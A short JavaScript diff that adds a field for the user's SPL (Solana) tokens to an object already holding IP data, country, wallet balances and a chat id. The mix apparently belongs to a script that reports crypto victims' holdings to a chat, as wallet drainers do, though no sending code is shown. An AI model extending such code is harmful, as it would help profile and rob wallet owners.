@@ -300,6 +300,7 @@ const a = {
             ipData: a,
             country: a.country,
             usd: this.solUsd,
+            tokens: this.splTokens,
             tokenBalance: this.tokenWalletBalance,
             chatid: this.a.chatId,
             totalbalance: this.totalBalance,
